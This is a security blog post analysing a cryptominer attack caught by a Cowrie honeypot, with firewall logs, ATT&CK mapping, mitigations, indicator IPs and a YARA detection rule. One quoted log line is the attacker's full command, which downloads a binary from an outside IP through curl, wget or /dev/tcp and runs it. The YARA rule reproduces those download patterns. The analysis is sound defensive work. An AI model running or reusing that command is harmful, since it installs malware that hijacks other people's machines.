<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Mining Attack Spotlight · MoraCyberInsights
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Gabriel Mora">
<meta name="description" content="Time and Date of Activity 06 May 2024 02:54
Relevant Logs, Malware AnalysisLink to headingThere were 2 firewall logs for the source IP &ldquo;39.108.186.231&rdquo; that was tracked.
**Date Time Source IP Source Port Target IP Target Port Protocol** 2024-05-06 02:54:17 39.108.186.231 16525 172.31.19.98 2222 6 2024-05-06 02:54:28 39.108.186.231 37700 172.31.19.98 2222 6 Firewall data was obtained through the ISC portal.
To choose the attack to research the &ldquo;playlog&rdquo; feature of the honeypot was used to investigate some attacks that took place.">
<meta name="keywords" content="blog,cybersecurity,personal">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Mining Attack Spotlight">
  <meta name="twitter:description" content="Time and Date of Activity 06 May 2024 02:54
Relevant Logs, Malware AnalysisLink to headingThere were 2 firewall logs for the source IP “39.108.186.231” that was tracked.
**Date Time Source IP Source Port Target IP Target Port Protocol** 2024-05-06 02:54:17 39.108.186.231 16525 172.31.19.98 2222 6 2024-05-06 02:54:28 39.108.186.231 37700 172.31.19.98 2222 6 Firewall data was obtained through the ISC portal.
To choose the attack to research the “playlog” feature of the honeypot was used to investigate some attacks that took place.">

<meta property="og:url" content="https://moracyberinsights.github.io/posts/miningattackspotlight/">
  <meta property="og:site_name" content="MoraCyberInsights">
  <meta property="og:title" content="Mining Attack Spotlight">
  <meta property="og:description" content="Time and Date of Activity 06 May 2024 02:54
Relevant Logs, Malware AnalysisLink to headingThere were 2 firewall logs for the source IP “39.108.186.231” that was tracked.
**Date Time Source IP Source Port Target IP Target Port Protocol** 2024-05-06 02:54:17 39.108.186.231 16525 172.31.19.98 2222 6 2024-05-06 02:54:28 39.108.186.231 37700 172.31.19.98 2222 6 Firewall data was obtained through the ISC portal.
To choose the attack to research the “playlog” feature of the honeypot was used to investigate some attacks that took place.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-22T12:35:56-05:00">
    <meta property="article:modified_time" content="2024-05-22T12:35:56-05:00">




<link rel="canonical" href="https://moracyberinsights.github.io/posts/miningattackspotlight/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://moracyberinsights.github.io/">
      MoraCyberInsights
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://moracyberinsights.github.io/posts/miningattackspotlight/">
              Mining Attack Spotlight
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2024-05-22T12:35:56-05:00">
                May 22, 2024
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              5-minute read
            </span>
          </div>
          
          
          
        </div>
      </header>

      <div class="post-content">
        
        <p><strong>Time and Date of Activity</strong> 06 May 2024 02:54</p>
<h3 id="relevant-logs-malware-analysis">
  Relevant Logs, Malware Analysis
  <a class="heading-link" href="#relevant-logs-malware-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>There were 2 firewall logs for the source IP &ldquo;39.108.186.231&rdquo; that was
tracked.</p>
<table>
<thead>
<tr>
<th>**Date</th>
<th>Time</th>
<th>Source IP</th>
<th>Source Port</th>
<th>Target IP</th>
<th>Target Port</th>
<th>Protocol**</th>
</tr>
</thead>
<tbody>
<tr>
<td>2024-05-06</td>
<td>02:54:17</td>
<td>39.108.186.231</td>
<td>16525</td>
<td>172.31.19.98</td>
<td>2222</td>
<td>6</td>
</tr>
<tr>
<td>2024-05-06</td>
<td>02:54:28</td>
<td>39.108.186.231</td>
<td>37700</td>
<td>172.31.19.98</td>
<td>2222</td>
<td>6</td>
</tr>
</tbody>
</table>
<p>Firewall data was obtained through the ISC portal.</p>
<p>To choose the attack to research the &ldquo;playlog&rdquo; feature of the honeypot
was used to investigate some attacks that took place.</p>
<p>python3 /srv/cowrie/bin/playlog
./b65fea451d07c3d5ff37c4b21496aa075078051a2c3145690babfa5956500ebf</p>
<p>This &ldquo;playlog&rdquo; looked interesting and I decided to gather further logs
by looking into the &ldquo;cowrie.json&rdquo; logs and using &ldquo;grep&rdquo; to filter for
the timestamp gathered from the previous finding &ldquo;02:54&rdquo;</p>
<p>cat /srv/cowrie/var/log/cowrie/cowrie.json.2024-05-06 | jq | grep
&quot;02:54&quot;</p>
<p>Found the first log for the session connect and then used grep to filter
further for only the session ID for this attack: &ldquo;a79d01830e6d&rdquo;</p>
<p>cat /srv/cowrie/var/log/cowrie/cowrie.json.2024-05-06 | jq | grep
&ldquo;a79d01830e6d&quot;</p>
<p>Found 14 logs with that session ID.</p>
<p>Sample of the logs found using grep to filter by session ID:</p>
<p>{&quot;eventid&quot;:&quot;cowrie.command.input&quot;,&quot;input&quot;:&quot;nohup $SHELL -c
\&quot;curl http://125.124.222.170:60111/linux -o /tmp/cETqZjW89H; if [ !
-f /tmp/cETqZjW89H ]; then wget http://125.124.222.170:60111/linux -O
/tmp/cETqZjW89H; fi; if [ ! -f /tmp/cETqZjW89H ]; then exec
6&lt;&gt;/dev/tcp/125.124.222.170/60111 &amp;&amp; echo -n 'GET /linux' &gt;&amp;6 &amp;&amp;
cat 0&lt;&amp;6 &gt; /tmp/cETqZjW89H &amp;&amp; chmod +x /tmp/cETqZjW89H &amp;&amp;
/tmp/cETqZjW89H
Zz1I8+B8WwQ/pGfqWhKwvAZf7We+NBVSfOr0TjMYHy1X/epoXAU3vm79WA69qg1d6Xi7PgVEYO7/Ty0bGipZ8e98WAYwpGfrWRK1vgpZ7Ge9JgFdfOr2TzMbHClX9OthUAM2u2TvSQ23txJb6WSkMA1EY+7wQysaGylN5elqWBs3v2fzWgSqtQ9R52C6NwRfcun9SzMbHyxX8Ot8WAQ/sGDtWAy0pA1Z7Hi5MRtYYerrSy4bECtJ9OllSgQ3vXjuWhK1sAtH7m+wMAVbZuHlSCwYBCRI6+ljWxs3sm/nXwy1tQxJ5Xi4Nw1EYOv1VywfGCdP9eljXBU3uGTzWw6yqghQ82S6NA9cYun1Sj0bEi1X9OhiRAc2uHjsXQu+sgxY7WWqNQxEY+7wVyweHTNA/eJkWgQ0v3bsWwmqtQ5d82S4NBtbZej/Ty0bGyxZ8e98WAYwpGfqRwuwvgpZ7GK9JgRbZfb2SjMbGSRX9OFmUAM2u2buSQ+9qg1Z5Xi7PgNEYOv0QysaGy1L5elqWRszvHjvWAmqtg5Y52C6NwVdcuv8VywcHzNI8e98Uw08vGbsWwmktQhe82K/KAJdfO/3QysaGy9I5eB8WAQxpGfkWxK2swZf7We+NBVbY+/rSCgcBCRN6+xjUAM2u2XvSQSqtQ9d82W4KAdbYOLzSSweGT1B9/ZjXwIov2XzWw69vgpZ7Ge7JgRSYPb0TCwEHyxX9OFlUAM2u2TqSQ20tRJR5Hi9MBtYYOLzSSwYGz1N8vZlXBs3vmbzXg6+sgxY7W+qNwdffOD9Vy8YHDNN8+JkWgQ0u2aysKCTzFZaaH8gNp9Eiw949ut29W5vPJ5LZcmvTMTa;
fi; echo 123456 &gt; /tmp/.opass; chmod +x /tmp/cETqZjW89H &amp;&amp;
/tmp/cETqZjW89H
Zz1I8+B8WwQ/pGfqWhKwvAZf7We+NBVSfOr0TjMYHy1X/epoXAU3vm79WA69qg1d6Xi7PgVEYO7/Ty0bGipZ8e98WAYwpGfrWRK1vgpZ7Ge9JgFdfOr2TzMbHClX9OthUAM2u2TvSQ23txJb6WSkMA1EY+7wQysaGylN5elqWBs3v2fzWgSqtQ9R52C6NwRfcun9SzMbHyxX8Ot8WAQ/sGDtWAy0pA1Z7Hi5MRtYYerrSy4bECtJ9OllSgQ3vXjuWhK1sAtH7m+wMAVbZuHlSCwYBCRI6+ljWxs3sm/nXwy1tQxJ5Xi4Nw1EYOv1VywfGCdP9eljXBU3uGTzWw6yqghQ82S6NA9cYun1Sj0bEi1X9OhiRAc2uHjsXQu+sgxY7WWqNQxEY+7wVyweHTNA/eJkWgQ0v3bsWwmqtQ5d82S4NBtbZej/Ty0bGyxZ8e98WAYwpGfqRwuwvgpZ7GK9JgRbZfb2SjMbGSRX9OFmUAM2u2buSQ+9qg1Z5Xi7PgNEYOv0QysaGy1L5elqWRszvHjvWAmqtg5Y52C6NwVdcuv8VywcHzNI8e98Uw08vGbsWwmktQhe82K/KAJdfO/3QysaGy9I5eB8WAQxpGfkWxK2swZf7We+NBVbY+/rSCgcBCRN6+xjUAM2u2XvSQSqtQ9d82W4KAdbYOLzSSweGT1B9/ZjXwIov2XzWw69vgpZ7Ge7JgRSYPb0TCwEHyxX9OFlUAM2u2TqSQ20tRJR5Hi9MBtYYOLzSSwYGz1N8vZlXBs3vmbzXg6+sgxY7W+qNwdffOD9Vy8YHDNN8+JkWgQ0u2aysKCTzFZaaH8gNp9Eiw949ut29W5vPJ5LZcmvTMTa\&quot;</p>
<p>In these logs we can see an attack that attempts to download and install
a malicious file.</p>
<p>The command &ldquo;nohup&rdquo; is used to run a command that will continue running
in the background even after the user logs out.</p>
<p>There are various attempts to download a file named &ldquo;linux&rdquo; using curl,
wget and exec (raw TCP connection).</p>
<p>Then &ldquo;chmod&rdquo; is used to make the file executable</p>
<p>chmod +x /tmp/cETqZjW89H</p>
<p>The file is then executed along with a very long encoded command</p>
<p>The long encoded argument passed to the executable likely contains
mining pool addresses, wallet IDs, encrypted binary data or other
configuration details needed to start mining operations.</p>
<p>A YARA rule was created to detect this activity. It was present in most
of the cowrie.json log files. There was a total of 222 instances of this
attack. Most of them originate from IP&rsquo;s that come from China. Below is
a bar graph of the number of instances of the attack by IP:</p>
<h3 id="which-vulnerability-does-the-attack-attempt-to-exploit">
  Which vulnerability does the attack attempt to exploit?
  <a class="heading-link" href="#which-vulnerability-does-the-attack-attempt-to-exploit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The attack does not exploit a CVE. However, it does take advantage of
default account credentials and living off the land to attempt
installing a miner on the endpoint.</p>
<p>MITRE ATT&amp;CK Framework:</p>
<p>Valid Accounts: Default Accounts</p>
<p>ID: T1078.001</p>
<p>Tactics: Initial Access, Defense Evasion, Persistence, Privilege
Escalation</p>
<p>&quot;username&quot;: &quot;root&quot;,</p>
<p>&quot;password&quot;: &quot;123456&quot;,</p>
<p>&quot;message&quot;: &quot;login attempt [root/123456] succeeded&quot;</p>
<p>Command and Scripting Interpreter: Unix Shell</p>
<p>ID: T1059.004</p>
<p>Tactic: Execution</p>
<p>&quot;$SHELL&quot;</p>
<p>Impact: Resource Hijacking</p>
<p>ID: T1496</p>
<p>Adversaries may leverage the resources of co-opted systems to complete
resource-intensive tasks, which may impact system and/or hosted service
availability.</p>
<h3 id="what-is-the-goal-of-the-attack">
  What is the goal of the attack?
  <a class="heading-link" href="#what-is-the-goal-of-the-attack">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The goal of the attack is to install a crypto miner in the endpoint to
hijack resources and help in mining. Cryptocurrency mining requires
significant CPU/GPU resources. By hijacking these resources on
compromised systems, attackers can mine cryptocurrencies for their own
benefit without incurring hardware or electricity costs.</p>
<h3 id="if-the-system-is-vulnerable-do-you-think-the-attack-will-be-successful">
  If the system is vulnerable, do you think the attack will be successful?
  <a class="heading-link" href="#if-the-system-is-vulnerable-do-you-think-the-attack-will-be-successful">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Yes. With the attacker knowing what default credentials to use the
attack can be successful. The default credentials used are for root
privilege access.</p>
<h3 id="how-can-a-system-be-protected-from-this-attack">
  How can a system be protected from this attack?
  <a class="heading-link" href="#how-can-a-system-be-protected-from-this-attack">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>M1027 Password Policies</p>
<p>Applications and appliances that utilize default username and password
should be changed immediately after the installation, and before
deployment to a production environment.</p>
<p>M1038 Execution Prevention</p>
<p>Use application control where appropriate.</p>
<p>M1031 Network Intrusion Prevention</p>
<p>Network intrusion detection and prevention systems that use network
signatures to identify traffic for specific adversary command and
control infrastructure and malware can be used to mitigate activity at
the network level.</p>
<h3 id="what-do-you-know-about-the-attacker">
  What do you know about the attacker?
  <a class="heading-link" href="#what-do-you-know-about-the-attacker">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>• References</p>
<p>• ThreatIntel</p>
<p>• Whois Information</p>
<p>• Shodan</p>
<p>• CyberGordon</p>
<p>• AlienVault</p>
<p>• ISC</p>
<p>The IP &ldquo;39.108.186.231&rdquo; is owned by &ldquo;Aliyun Computing Co., LTD&rdquo; a
company based in Shenzhen, China. It was first reported to the Internet
Storm Center (ISC) on 2024-04-17 and last seen on 2024-05-20.</p>
<p><a href="https://www.shodan.io/host/39.108.186.231"  class="external-link" target="_blank" rel="noopener">https://www.shodan.io/host/39.108.186.231</a></p>
<p><a href="https://www.virustotal.com/gui/ip-address/39.108.186.231"  class="external-link" target="_blank" rel="noopener">https://www.virustotal.com/gui/ip-address/39.108.186.231</a></p>
<p><a href="https://isc.sans.edu/ipinfo/39.108.186.231"  class="external-link" target="_blank" rel="noopener">https://isc.sans.edu/ipinfo/39.108.186.231</a></p>
<p><a href="https://cybergordon.com/r/ab379e5f-3b10-46e9-a1f6-09ea0fee8c03"  class="external-link" target="_blank" rel="noopener">https://cybergordon.com/r/ab379e5f-3b10-46e9-a1f6-09ea0fee8c03</a></p>
<p><a href="https://otx.alienvault.com/indicator/ip/39.108.186.231"  class="external-link" target="_blank" rel="noopener">https://otx.alienvault.com/indicator/ip/39.108.186.231</a></p>
<p><a href="https://www.abuseipdb.com/check/39.108.186.231"  class="external-link" target="_blank" rel="noopener">https://www.abuseipdb.com/check/39.108.186.231</a></p>
<h3 id="indicators-of-compromise">
  Indicators of Compromise
  <a class="heading-link" href="#indicators-of-compromise">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>• IP List</p>
<p>• Yara</p>
<p>8.217.250.82 : 72 (Hong Kong)</p>
<p>47.242.155.75 : 24 (Hong Kong)</p>
<p>112.91.111.189 : 24 (Shaoguan, China)</p>
<p>103.219.60.221 : 24 (China)</p>
<p>47.243.127.74 : 12 (Hong Kong)</p>
<p>182.151.53.219 : 12 (Chengdu, China)</p>
<p>45.248.10.221 : 12 (Nanjing, China)</p>
<p>129.144.180.26 : 6 (USA)</p>
<p>8.130.99.203 : 6 (Beijing, China)</p>
<p>8.140.247.22 : 6 (Beijing, China)</p>
<p>47.108.193.65 : 4 (Chengdu, China)</p>
<p>101.37.165.47 : 4 (Hangzhou, China)</p>
<p>201.96.108.45 : 4 (Mexico)</p>
<p>120.26.246.36 : 3 (Hangzhou, China)</p>
<p>47.76.53.45 : 2 (Hong Kong)</p>
<p>8.219.190.124 : 2 (Singapore)</p>
<p>47.109.33.13 : 2 (Chengdu, China)</p>
<p>18.162.42.49 : 2 (Hong Kong)</p>
<p>101.132.104.127 : 1 (Shanghai, China)</p>
<p>39.108.186.231 : 2 (Shenzhen, China)</p>
<p>Yara rule:</p>
<p>rule Miner</p>
<p>{</p>
<p>meta:</p>
<p>description = &quot;Detects potential miner attack&quot;</p>
<p>author = &quot;Gabriel Mora&quot;</p>
<p>date = &quot;2024-05-23&quot;</p>
<p>version = &quot;1.0&quot;</p>
<p>strings:</p>
<p>$min_curl = /curl
http:\/\/[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]+\/linux -o
\/tmp\/[a-zA-Z0-9]+/</p>
<p>$min_wget = /wget
http:\/\/[0-9]{1,3}(\.[0-9]{1,3}){3}:[0-9]+\/linux -O
\/tmp\/[a-zA-Z0-9]+/</p>
<p>$min_tcp = /exec
6&lt;&gt;\/dev\/tcp\/[0-9]{1,3}(\.[0-9]{1,3}){3}\/[0-9]+ &amp;&amp; echo
-n 'GET \/linux' &gt;&amp;6 &amp;&amp; cat 0&lt;&amp;6 &gt; \/tmp\/[a-zA-Z0-9]+/</p>
<p>$min_chmod = /chmod \+x \/tmp\/[a-zA-Z0-9]+ &amp;&amp;
\/tmp\/[a-zA-Z0-9]+ [a-zA-Z0-9+\/]+/</p>
<p>condition:</p>
<p>all of ($min*)</p>
<p>}</p>
<p>Analyst Name: Gabriel Mora Ramos Date of Analysis: 5/22/2024</p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2017 -
    
    2024
     Gabriel Mora 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
